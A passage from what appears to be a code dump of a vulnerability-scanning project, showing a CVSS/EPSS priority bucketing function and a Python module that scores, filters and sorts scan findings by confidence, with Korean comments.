def categorize_by_priority(vulnerabilities: List[Dict[str, Any]]) -> Dict[str, List[Dict]]:
    """
    취약점을 우선순위별로 분류
    
    Returns:
        {
            'immediate': [...],  # 즉시 처리 (CVSS>=7 and EPSS>=0.1)
            'high': [...],       # 높은 우선순위
            'medium': [...],     # 중간 우선순위
            'low': [...]         # 낮은 우선순위
        }
    """
    categorized = {
        'immediate': [],
        'high': [],
        'medium': [],
        'low': []
    }
    
    for vuln in vulnerabilities:
        cvss = vuln.get('cvss', 0.0)
        epss = vuln.get('epss', 0.0)
        
        # 우선순위 계산
        if cvss >= 7.0 and epss >= 0.1:
            categorized['immediate'].append(vuln)
        elif cvss >= 7.0 or epss >= 0.2:
            categorized['high'].append(vuln)
        elif cvss >= 4.0 or epss >= 0.05:
            categorized['medium'].append(vuln)
        else:
            categorized['low'].append(vuln)
    
    return categorized
```
---

## File 45: confidence.py
**Absolute Path:** `d:\3차 프로젝트\worker_entry\app\core\utils\confidence.py`

```python
# app/core/utils/confidence.py
# 결과 신뢰도 스코어링 시스템

import logging
from typing import Dict, Any, List

logger = logging.getLogger(__name__)


def calculate_confidence_score(finding: Dict[str, Any]) -> int:
    """
    발견된 취약점의 신뢰도 계산 (0~100)
    
    가중치 기반 점수 계산으로 개선
    
    Args:
        finding: 발견된 취약점 정보
    
    Returns:
        신뢰도 점수 (0~100)
    """
    # 가중치 정의
    weights = {
        'exploit_verified': 35,
        'multiple_sources': 15,
        'nse_scripts': 12,
        'web_vuln_verified': 20,
        'high_version_accuracy': 8,
        'banner_grabbed': 10
    }
    
    score = 50  # 기본 점수
    
    # 가점 요소 (최대 50점)
    
    # 1. 실제 익스플로잇 검증 완료
    if finding.get("exploit_verified") or finding.get("exploitable"):
        score += weights['exploit_verified']
        logger.debug("익스플로잇 검증 완료: +35점")
    
    # 2. 여러 소스에서 확인
    sources = finding.get("sources", [])
    if isinstance(sources, list) and len(sources) > 1:
        score += weights['multiple_sources']
        logger.debug(f"여러 소스 확인 ({len(sources)}개): +15점")
    elif isinstance(sources, str):
        # 문자열이면 여러 키워드 확인
        source_keywords = ["nse_script", "exploit", "version_match", "banner"]
        found_keywords = sum(1 for keyword in source_keywords if keyword in sources.lower())
        if found_keywords > 1:
            score += weights['multiple_sources']
    
    # 3. NSE 스크립트로 확인
    if finding.get("nse_scripts") or "nse_script" in str(finding.get("sources", "")).lower():
        score += weights['nse_scripts']
        logger.debug("NSE 스크립트 확인: +12점")
    
    # 4. 실제 웹 취약점 테스트로 확인
    if finding.get("vulnerability_test") or finding.get("web_vuln_verified"):
        score += weights['web_vuln_verified']
        logger.debug("웹 취약점 테스트 확인: +20점")
    
    # 5. 버전 정확도
    if finding.get("version") and finding.get("version_accuracy", 0) > 0.8:
        score += weights['high_version_accuracy']
        logger.debug("높은 버전 정확도: +8점")
    
    # 6. 배너 그랩핑으로 확인
    if finding.get("banner") or finding.get("banner_grabbed"):
        score += weights['banner_grabbed']
        logger.debug("배너 그랩핑 확인: +10점")
    
    # 감점 요소 (최대 -40점)
    
    # 1. 단순 버전 매칭만
    detection_method = finding.get("detection_method", "")
    if detection_method == "version_match" and not finding.get("exploit_verified"):
        score -= 25  # 기존 -30에서 -25로 조정
        logger.debug("단순 버전 매칭만: -25점")
    
    # 2. 불확실한 정보
    if finding.get("uncertain") or finding.get("low_confidence"):
        score -= 15  # 기존 -20에서 -15로 조정
        logger.debug("불확실한 정보: -15점")
    
    # 3. 오래된 정보
    if finding.get("old_data") or finding.get("stale"):
        score -= 10
        logger.debug("오래된 정보: -10점")
    
    # 4. 추측 기반
    if finding.get("guessed") or finding.get("assumed"):
        score -= 12  # 기존 -15에서 -12로 조정
        logger.debug("추측 기반: -12점")
    
    # 점수 범위 제한 (0~100)
    score = max(0, min(100, score))
    
    return score


def get_confidence_level(score: int) -> str:
    """
    신뢰도 점수를 레벨로 변환
    
    Args:
        score: 신뢰도 점수 (0~100)
    
    Returns:
        신뢰도 레벨 ("VERY_HIGH", "HIGH", "MEDIUM", "LOW", "VERY_LOW")
    """
    if score >= 80:
        return "VERY_HIGH"
    elif score >= 60:
        return "HIGH"
    elif score >= 40:
        return "MEDIUM"
    elif score >= 20:
        return "LOW"
    else:
        return "VERY_LOW"


def enhance_finding_with_confidence(finding: Dict[str, Any]) -> Dict[str, Any]:
    """
    발견된 취약점에 신뢰도 정보 추가
    
    Args:
        finding: 발견된 취약점 정보
    
    Returns:
        신뢰도 정보가 추가된 취약점 정보
    """
    score = calculate_confidence_score(finding)
    level = get_confidence_level(score)
    
    finding["confidence_score"] = score
    finding["confidence_level"] = level
    
    return finding


def filter_by_confidence(
    findings: List[Dict[str, Any]],
    min_score: int = 40
) -> List[Dict[str, Any]]:
    """
    신뢰도 점수로 필터링
    
    Args:
        findings: 발견된 취약점 리스트
        min_score: 최소 신뢰도 점수
    
    Returns:
        필터링된 취약점 리스트
    """
    filtered = []
    
    for finding in findings:
        # 신뢰도 점수 계산 (없으면 추가)
        if "confidence_score" not in finding:
            finding = enhance_finding_with_confidence(finding)
        
        if finding.get("confidence_score", 0) >= min_score:
            filtered.append(finding)
    
    return filtered


def sort_by_confidence(
    findings: List[Dict[str, Any]],
    reverse: bool = True
) -> List[Dict[str, Any]]:
    """
    신뢰도 점수로 정렬
    
    Args:
        findings: 발견된 취약점 리스트
        reverse: 내림차순 여부 (True면 높은 점수부터)
    
    Returns:
        정렬된 취약점 리스트
    """
    # 신뢰도 점수 계산 (없으면 추가)
    enhanced = [enhance_finding_with_confidence(f) for f in findings]
    
    # 정렬
    sorted_findings = sorted(
        enhanced,
        key=lambda x: x.get("confidence_score", 0),
        reverse=reverse
    )
    
    return sorted_findings

```
---
